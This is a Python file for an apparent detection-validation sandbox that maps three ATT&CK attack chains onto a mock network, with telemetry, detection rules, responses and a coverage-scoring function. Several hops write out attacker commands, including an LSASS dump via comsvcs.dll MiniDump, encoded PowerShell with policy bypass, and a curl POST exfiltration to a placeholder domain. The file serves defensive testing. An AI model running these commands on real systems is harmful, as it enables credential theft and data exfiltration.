SANDBOX_ZONES = [
    "Internet",
    "Workstation",
    "Server",
    "Identity",
    "Domain Controller",
    "SIEM/EDR",
]


SANDBOX_NODES = [
    {"id": "attacker", "label": "External Actor", "zone": "Internet", "ip": "203.0.113.20"},
    {"id": "mail", "label": "Mail Gateway", "zone": "Internet", "ip": "198.51.100.15"},
    {"id": "workstation", "label": "Finance Workstation", "zone": "Workstation", "ip": "10.0.10.24"},
    {"id": "jumpbox", "label": "Admin Jumpbox", "zone": "Workstation", "ip": "10.0.20.8"},
    {"id": "app", "label": "Public Web App", "zone": "Server", "ip": "10.0.30.12"},
    {"id": "file", "label": "File Server", "zone": "Server", "ip": "10.0.30.30"},
    {"id": "identity", "label": "Identity Provider", "zone": "Identity", "ip": "10.0.40.10"},
    {"id": "dc", "label": "Domain Controller", "zone": "Domain Controller", "ip": "10.0.40.20"},
    {"id": "siem", "label": "SIEM/EDR", "zone": "SIEM/EDR", "ip": "10.0.50.5"},
]


SANDBOX_EDGES = [
    ("attacker", "mail"),
    ("mail", "workstation"),
    ("workstation", "file"),
    ("workstation", "jumpbox"),
    ("jumpbox", "dc"),
    ("attacker", "app"),
    ("app", "file"),
    ("file", "dc"),
    ("identity", "dc"),
    ("workstation", "siem"),
    ("app", "siem"),
    ("dc", "siem"),
]


ATTACK_PATHS = [
    {
        "id": "phish_power_shell",
        "label": "Phishing to PowerShell to C2",
        "seed_techniques": ["T1566.001", "T1204.002", "T1059.001"],
        "summary": "User execution leads to PowerShell, persistence, and command-and-control telemetry.",
        "hops": [
            {
                "from": "attacker",
                "to": "mail",
                "technique_id": "T1566.001",
                "technique_name": "Spearphishing Attachment",
                "action": "Deliver attachment to user mailbox",
                "command": "Attachment: invoice_<CAMPAIGN_ID>.docm",
                "telemetry": ["Email gateway attachment hash", "Sender domain reputation", "User mailbox delivery event"],
                "detection": "Attachment from low-reputation sender reaches targeted user.",
                "response": "Quarantine message, preserve headers, identify recipients.",
                "realtime_signal": "EmailAttachmentHash + SenderDomain + RecipientUser",
                "reaction_seconds": 18,
            },
            {
                "from": "mail",
                "to": "workstation",
                "technique_id": "T1204.002",
                "technique_name": "Malicious File",
                "action": "User opens attachment in controlled validation sandbox",
                "command": "WINWORD.EXE opens <VALIDATION_DOCUMENT>.docm",
                "telemetry": ["Office process start", "Document open event", "Mark-of-the-Web metadata"],
                "detection": "Office process opens macro-enabled file from external email.",
                "response": "Collect document, process tree, and user context.",
                "realtime_signal": "ParentImage=OUTLOOK.EXE and Image=WINWORD.EXE",
                "reaction_seconds": 25,
            },
            {
                "from": "workstation",
                "to": "file",
                "technique_id": "T1059.001",
                "technique_name": "PowerShell",
                "action": "PowerShell executes encoded validation command",
                "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <BASE64_PLACEHOLDER>",
                "telemetry": ["Windows 4688", "PowerShell 4104", "Sysmon Event ID 1"],
                "detection": "Encoded PowerShell with execution-policy bypass from Office lineage.",
                "response": "Isolate workstation if not approved, collect script block logs.",
                "realtime_signal": "CommandLine contains -EncodedCommand and -ExecutionPolicy Bypass",
                "reaction_seconds": 12,
            },
            {
                "from": "workstation",
                "to": "siem",
                "technique_id": "T1071.001",
                "technique_name": "Web Protocols",
                "action": "Controlled callback to validation endpoint",
                "command": "Invoke-WebRequest http://<VALIDATION_DOMAIN>/stage/<CAMPAIGN_ID>",
                "telemetry": ["Proxy URL log", "DNS query", "EDR network connection"],
                "detection": "PowerShell process contacts validation domain over HTTP.",
                "response": "Block domain, hunt for same campaign ID, review host timeline.",
                "realtime_signal": "Image=powershell.exe and Url contains /stage/",
                "reaction_seconds": 9,
            },
        ],
    },
    {
        "id": "valid_account_identity",
        "label": "Valid Account to Domain Credential Access",
        "seed_techniques": ["T1078", "T1021.001", "T1003.001", "T1550.002"],
        "summary": "Compromised credentials enable remote access, credential dumping telemetry, and pass-the-hash risk.",
        "hops": [
            {
                "from": "attacker",
                "to": "identity",
                "technique_id": "T1078",
                "technique_name": "Valid Accounts",
                "action": "Authenticate with compromised but known test account",
                "command": "LogonType=10 User=<VALIDATION_USER>",
                "telemetry": ["Windows 4624", "Impossible travel signal", "MFA context"],
                "detection": "New remote logon from unusual source for privileged user.",
                "response": "Disable session, rotate password, validate MFA status.",
                "realtime_signal": "EventID=4624 and LogonType=10 and Risk=High",
                "reaction_seconds": 20,
            },
            {
                "from": "identity",
                "to": "jumpbox",
                "technique_id": "T1021.001",
                "technique_name": "Remote Desktop Protocol",
                "action": "Move to admin jumpbox using RDP",
                "command": "mstsc.exe /v:<JUMPBOX_HOST>",
                "telemetry": ["TerminalServices logon", "Windows 4627", "EDR interactive session"],
                "detection": "Privileged RDP session to jumpbox outside normal admin window.",
                "response": "Review session recording, isolate jumpbox if suspicious.",
                "realtime_signal": "DestinationHost=jumpbox and UserRisk=High",
                "reaction_seconds": 30,
            },
            {
                "from": "jumpbox",
                "to": "dc",
                "technique_id": "T1003.001",
                "technique_name": "LSASS Memory",
                "action": "Attempt credential access on privileged host",
                "command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> <DUMP_PATH> full",
                "telemetry": ["Sysmon Event ID 10", "Process access to LSASS", "Dump file creation"],
                "detection": "Process requests suspicious access rights to LSASS.",
                "response": "Terminate process, collect memory artifact, rotate impacted credentials.",
                "realtime_signal": "TargetImage=lsass.exe and GrantedAccess suspicious",
                "reaction_seconds": 8,
            },
            {
                "from": "dc",
                "to": "siem",
                "technique_id": "T1550.002",
                "technique_name": "Pass the Hash",
                "action": "Attempt hash reuse across domain systems",
                "command": "NTLM authentication from <HOST_A> to <HOST_B>",
                "telemetry": ["Windows 4624 NTLM", "Windows 4776", "Lateral movement graph"],
                "detection": "Same account authenticates via NTLM to multiple hosts rapidly.",
                "response": "Disable account, reset Kerberos tickets, review lateral movement.",
                "realtime_signal": "NTLM fan-out threshold exceeded within 10 minutes",
                "reaction_seconds": 14,
            },
        ],
    },
    {
        "id": "web_shell_exfil",
        "label": "Public App to Web Shell to Exfiltration",
        "seed_techniques": ["T1190", "T1059.004", "T1505.003", "T1041"],
        "summary": "Public-facing app compromise leads to shell execution, web shell persistence, and C2 exfiltration telemetry.",
        "hops": [
            {
                "from": "attacker",
                "to": "app",
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "action": "Trigger known validation route in vulnerable app",
                "command": "GET /<VALIDATION_ROUTE>?cmd=<PLACEHOLDER>",
                "telemetry": ["Web access log", "WAF alert", "HTTP 500 spike"],
                "detection": "Known exploit pattern against public app endpoint.",
                "response": "Block route, snapshot container, collect request payload.",
                "realtime_signal": "WAF signature + anomalous endpoint request",
                "reaction_seconds": 11,
            },
            {
                "from": "app",
                "to": "file",
                "technique_id": "T1059.004",
                "technique_name": "Unix Shell",
                "action": "Spawn shell under web service identity",
                "command": "/bin/sh -c '<VALIDATION_COMMAND>'",
                "telemetry": ["Process start from web worker", "Container exec log", "EDR Linux sensor"],
                "detection": "Web server process spawns interactive shell.",
                "response": "Quarantine workload, preserve container filesystem layer.",
                "realtime_signal": "ParentProcess=nginx/apache and Image=/bin/sh",
                "reaction_seconds": 7,
            },
            {
                "from": "app",
                "to": "file",
                "technique_id": "T1505.003",
                "technique_name": "Web Shell",
                "action": "Write controlled web shell artifact for validation",
                "command": "FileName=/var/www/html/<VALIDATION_SHELL>.php",
                "telemetry": ["File write", "Web root integrity change", "New script execution"],
                "detection": "New executable script appears under web root.",
                "response": "Remove artifact, rotate app secrets, review write path.",
                "realtime_signal": "FileName endswith .php in webroot and User=www-data",
                "reaction_seconds": 16,
            },
            {
                "from": "file",
                "to": "siem",
                "technique_id": "T1041",
                "technique_name": "Exfiltration Over C2 Channel",
                "action": "Controlled outbound transfer to validation endpoint",
                "command": "curl -X POST http://<VALIDATION_DOMAIN>/upload -d @<TEST_DATA>",
                "telemetry": ["Proxy upload size", "DNS query", "Outbound HTTP POST"],
                "detection": "Web service account sends unusual outbound POST.",
                "response": "Block egress, inspect payload metadata, verify no real data left.",
                "realtime_signal": "User=www-data and HTTP_METHOD=POST and BytesOut anomaly",
                "reaction_seconds": 10,
            },
        ],
    },
]


def generate_topology(seed_technique: str = "T1059.001") -> dict:
    return {
        "seed_technique": seed_technique,
        "zones": SANDBOX_ZONES,
        "nodes": SANDBOX_NODES,
        "edges": SANDBOX_EDGES,
    }


def generate_attack_paths(seed_technique: str = "T1059.001") -> list[dict]:
    matching = [
        path for path in ATTACK_PATHS
        if seed_technique in path["seed_techniques"]
    ]
    remaining = [
        path for path in ATTACK_PATHS
        if path not in matching
    ]
    return matching + remaining


def score_path_detection(path: dict) -> dict:
    reaction_times = [hop["reaction_seconds"] for hop in path["hops"]]
    telemetry_count = sum(len(hop["telemetry"]) for hop in path["hops"])
    covered_hops = sum(1 for hop in path["hops"] if hop.get("detection") and hop.get("realtime_signal"))
    coverage = round((covered_hops / len(path["hops"])) * 100)
    avg_reaction = round(sum(reaction_times) / len(reaction_times))
    missing = []
    if telemetry_count < len(path["hops"]) * 3:
        missing.append("Add one more telemetry source per hop")
    if avg_reaction > 20:
        missing.append("Reduce alert triage latency below 20 seconds")
    return {
        "coverage": coverage,
        "avg_reaction_seconds": avg_reaction,
        "telemetry_sources": telemetry_count,
        "missing": missing,
    }
